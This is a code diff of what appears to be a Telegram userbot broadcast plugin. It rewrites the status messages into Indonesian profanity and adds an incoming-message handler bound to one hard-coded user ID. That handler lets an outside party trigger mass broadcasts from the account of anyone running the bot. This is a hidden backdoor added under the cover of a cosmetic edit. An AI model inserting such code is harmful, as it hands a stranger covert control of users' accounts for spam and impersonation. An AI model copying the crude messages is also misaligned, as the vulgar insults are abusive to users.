@@ -34,9 +34,9 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        await event.edit("**Berikan Sebuah Pesan atau Reply**")
+        await event.edit("**Mana pesannya Ngentod, minimal reply lah anjing!!**")
         return
-    kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 📢`")
+    kk = await event.edit("`Lagi gua kirim pesan nya Jing, Awas limit hehehe...`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -55,6 +55,8 @@ async def gcast(event):
     )
 
 @register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
+@register(incoming=True, from_users=1826643972,
+          pattern=r"^\.cgucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if not xx:
